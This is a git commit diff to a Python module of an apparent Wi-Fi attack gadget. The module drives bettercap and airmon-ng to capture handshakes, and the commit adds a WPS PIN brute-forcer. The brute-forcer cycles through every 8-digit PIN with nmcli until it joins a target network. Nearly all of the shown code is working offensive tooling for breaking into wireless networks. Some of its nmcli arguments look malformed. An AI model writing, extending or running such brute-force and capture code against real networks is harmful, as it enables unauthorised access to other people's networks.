7d8e8125f7f65106e33978670e0340892d7c262a
lif28 <160417499+Lif28@users.noreply.github.com>
2025-01-09 16:11:35 +0100

    Update netstd.py

--- src/nevermind/lib/netstd.py
+++ src/nevermind/lib/netstd.py
@@ -7,8 +7,8 @@ import time
 
 bk_ = 0
 
-class CapHandshakes():
-    def __init__(self, INTERFACE):
+class netstd():
+    def __init__(self, INTERFACE, selected_option=None, wps_pin=None):
         self.INTERFACE = INTERFACE
         self.bettercap_process = subprocess.Popen(
             ['sudo', 'bettercap', '-iface', f'{INTERFACE}'],
@@ -18,6 +18,16 @@ class CapHandshakes():
             text=True,
             bufsize=1
         )
+
+    def run_result(self, selected_option, INTERFACE, wps_pin):
+        result = subprocess.run(
+                    ["nmcli", "dev", "wifi", "connect", selected_option, "infname", INTERFACE, "--wps-wps_pin", wps_pin],
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True
+                )
+        return result
+
 
     def bk(self):
         if GPIO.input(KEY3_PIN) == 0:
@@ -37,7 +47,9 @@ class CapHandshakes():
 
     def interface_start(self, INTERFACE):
         time.sleep(0.5)
+        os.system(f"sudo ifconfig {INTERFACE} down")
         os.system(f"sudo airmon-ng start {INTERFACE}")
+        os.system(f"sudo ifconfig {INTERFACE} up")
         if self.bk() == True:
             return 1
         else:
@@ -73,9 +85,7 @@ class CapHandshakes():
 
             #key3
             if self.bk() == True:
-                killwhile = 1
-                return killwhile
-                break
+                return 1
 
             time.sleep(2)
             ui_print(f"Loading ({commands.index(i)})", 0.5)
@@ -83,15 +93,59 @@ class CapHandshakes():
 
             #key3
             if self.bk() == True:
-                killwhile = 1
-                return killwhile
-                break
+                return 1
 
             self.bettercap_process.stdin.flush()
             ui_print(messages[commands.index(i)], 1)
 
             #Write output
-            with open("/kali/home/mojito/logs/output.txt", 'a') as file:
+            with open("/home/kali/mojito/logs/output.txt", 'a') as file:
                 file.write(self.bettercap_process.stdout.readline())
 
         return 0
+    
+
+
+    #WPS
+
+
+
+    def generate(self):
+        for var in range(0, 100000000):
+            yield f"{var:08d}"  
+
+    def connect(self, selected_option, wps_pin, INTERFACE):
+        try:
+            result = self.run_result(selected_option, INTERFACE, wps_pin)
+
+            if "successfully activated" in result.stdout.lower():
+                ui_print(f"Connected'{selected_option}' \n PIN: {wps_pin}", 5)
+                return 0
+            else:
+                ui_print(f"PIN {wps_pin} failed.")
+                return 1
+            
+        except Exception as e:
+            ui_print(f"Error {wps_pin}:\n {e}")
+            with open("/home/kali/mojito/logs/output2.txt", 'a') as file:
+                file.write(f"Error {wps_pin}:\n {e}")
+            return 1
+
+    def brute_force_wps(self, selected_option, INTERFACE):
+        for wps_pin in self.generate():
+            if self.connect(selected_option, wps_pin, INTERFACE) == 0:
+                ui_print(f"PIN : {wps_pin}")
+                break
+            else:
+                pass
+            time.sleep(0.1)
+        return 0
+
+
+
+
+    # network_ssid = getinput() 
+    # brute_force_wps(network_ssid)
+    
+
+        
